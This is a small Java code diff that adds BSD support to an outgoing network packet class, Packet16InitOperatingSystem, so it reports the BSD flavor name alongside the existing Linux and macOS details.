@@ -8,6 +8,7 @@ import com.redpois0n.oslib.AbstractOperatingSystem;
 import com.redpois0n.oslib.Arch;
 import com.redpois0n.oslib.DesktopEnvironment;
 import com.redpois0n.oslib.OperatingSystem;
+import com.redpois0n.oslib.bsd.BSDOperatingSystem;
 import com.redpois0n.oslib.linux.LinuxOperatingSystem;
 import com.redpois0n.oslib.osx.OSXOperatingSystem;
 
@@ -54,6 +55,9 @@ public class Packet16InitOperatingSystem extends AbstractOutgoingPacket {
 				sw.writeLine(oos.getVersion().getDisplay());
 				sw.writeLine(oos.getVersion().getVersion());
 			}
+		} else if (os.getType() == OperatingSystem.BSD) {
+			BSDOperatingSystem bos = (BSDOperatingSystem) os;
+			sw.writeLine(bos.getFlavor().getName());
 		}
 	}
 
